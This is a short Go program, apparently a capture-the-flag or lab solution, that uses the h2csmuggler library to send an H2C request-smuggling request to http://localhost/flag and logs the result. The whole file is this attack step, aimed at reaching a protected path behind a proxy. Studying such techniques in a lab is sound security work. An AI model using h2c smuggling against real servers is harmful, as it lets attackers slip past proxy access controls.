package main

import (
	"github.com/minight/h2csmuggler"
	"github.com/sirupsen/logrus"
)

func main() {
	logrus.SetLevel(logrus.DebugLevel)
	logrus.Infof("starting request")
	err := h2csmuggler.Request("http://localhost/flag")
	if err != nil {
		logrus.WithError(err).Fatalf("Failed to make request")
	}
}
